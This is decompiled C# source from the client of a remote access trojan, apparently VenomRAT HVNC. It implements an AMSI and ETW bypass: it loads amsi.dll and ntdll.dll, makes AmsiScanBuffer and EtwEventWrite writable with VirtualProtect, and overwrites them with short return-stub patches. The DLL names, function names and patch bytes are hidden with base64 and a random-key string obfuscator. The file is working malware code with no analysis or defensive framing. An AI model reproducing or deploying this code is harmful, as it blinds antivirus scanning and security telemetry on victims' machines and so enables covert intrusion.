﻿// Decompiled with JetBrains decompiler
// Type: Client.Helper.A
// Assembly: Client, Version=5.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: AF1838BC-6B25-40E4-9339-7F493AC3654D
// Assembly location: C:\Users\Younn\RiderProjects\VenomRAT_HVNC-5.0.4.0\VenomRAT_HVNC\bin\Debug\Client.exe

using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Client.Algorithm;


namespace Client.Helper
{
    public class ByPass : StringObf
    {
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
            string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        public static void Edr()
        {

            if (Is64Bit())
            {
                PatchMemory(DecodeBase64Str(NameDllAmsi()), DecodeBase64Str(FonctionDllAmsi()),
                    DecodeBase64Bytes(X64PatchSllAmsi()));
                PatchMemory(DecodeBase64Str(NameDllEtw()), DecodeBase64Str(FonctionDllEtw()),
                    DecodeBase64Bytes(X64PatchDllEtw()));
            }
            else if (!Is64Bit())
            {
                PatchMemory(DecodeBase64Str(NameDllAmsi()), DecodeBase64Str(FonctionDllAmsi()),
                    DecodeBase64Bytes(X86PatchSllAmsi()));
                PatchMemory(DecodeBase64Str(NameDllEtw()), DecodeBase64Str(FonctionDllEtw()),
                    DecodeBase64Bytes(X86PatchDllEtw()));
            }
        }

        private static void PatchMemory(string nameDll, string nameFonction, byte[] patch)
        {
            IntPtr library = LoadLibrary(nameDll);
            IntPtr procAddress = GetProcAddress(library, nameFonction);
            uint output;
            bool vProtect = VirtualProtect(procAddress, (UIntPtr)patch.Length, 0x40, out output);
            Marshal.Copy(patch, 0, procAddress, patch.Length);
            Exceptions(library, procAddress, vProtect, nameDll, nameFonction);
        }

        private static bool Is64Bit()
        {
            if (IntPtr.Size == 8)
            {
                return true;
            }

            return false;
        }

        private static string DecodeBase64Str(string input)
        {
            return Encoding.ASCII.GetString(Convert.FromBase64String(input));
        }

        private static byte[] DecodeBase64Bytes(string input)
        {
            return Convert.FromBase64String(input);
        }

        private static void Exceptions(IntPtr library, IntPtr procAdress, bool vProtect, string nameDll,
            string fonctionDll)
        {
            if (library == IntPtr.Zero)
            {
                MessageBox.Show(nameDll + @" n'a pas etait charger correctement !", @"by amn...", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            }
            else if (procAdress == IntPtr.Zero)
            {
                MessageBox.Show(fonctionDll + @" n'a pas etait charger correctement !", @"by amn...",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else if (!vProtect)
            {
                MessageBox.Show(nameDll + " n'a pas etait patcher VirtualProtect = " + vProtect, @"by amn...",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
    }
    public class StringObf
    {
        private static string key = new GenerateKey(256).GenerateStrenghCharacter();
        private static string Obfuscate(string input)
        {
            string obfuscationPattern = key;
            var obfuscated = new StringBuilder();

            foreach (char c in input)
            {
                obfuscated.Append(obfuscationPattern + c + obfuscationPattern);
            }

            return obfuscated.ToString();
        }

        private static string Deobfuscate(string input)
        {
            string obfuscationPattern = key;
            return input.Replace(obfuscationPattern, "");
        }

        private static string _obfuscatedNameDllEtw = Obfuscate("bnRkbGwuZGxs");
        private static string obfuscatedFonctionDllEtw = Obfuscate("RXR3RXZlbnRXcml0ZQ==");
        private static string obfuscatedX64PatchDllEtw = Obfuscate("SDPAww==");
        private static string obfuscatedX86PatchDllEtw = Obfuscate("M8DCFAA=");
        private static string obfuscatedNameDllAmsi = Obfuscate("YW1zaS5kbGw=");
        private static string obfuscatedFonctionDllAmsi = Obfuscate("QW1zaVNjYW5CdWZmZXI=");
        private static string obfuscatedX64PatchSllAmsi = Obfuscate("uFcAB4DD");
        private static string obfuscatedX86PatchSllAmsi = Obfuscate("uFcAB4DCGAA=");

        public static string NameDllEtw()
        {
            return Deobfuscate(_obfuscatedNameDllEtw);
        }

        public static string FonctionDllEtw()
        {
            return Deobfuscate(obfuscatedFonctionDllEtw);
        }

        public static string X64PatchDllEtw()
        {
            return Deobfuscate(obfuscatedX64PatchDllEtw);
        }

        public static string X86PatchDllEtw()
        {
            return Deobfuscate(obfuscatedX86PatchDllEtw);
        }

        public static string NameDllAmsi()
        {
            return Deobfuscate(obfuscatedNameDllAmsi);
        }

        public static string FonctionDllAmsi()
        {
            return Deobfuscate(obfuscatedFonctionDllAmsi);
        }

        public static string X64PatchSllAmsi()
        {
            return Deobfuscate(obfuscatedX64PatchSllAmsi);
        }

        public static string X86PatchSllAmsi()
        {
            return Deobfuscate(obfuscatedX86PatchSllAmsi);
        }
    }

}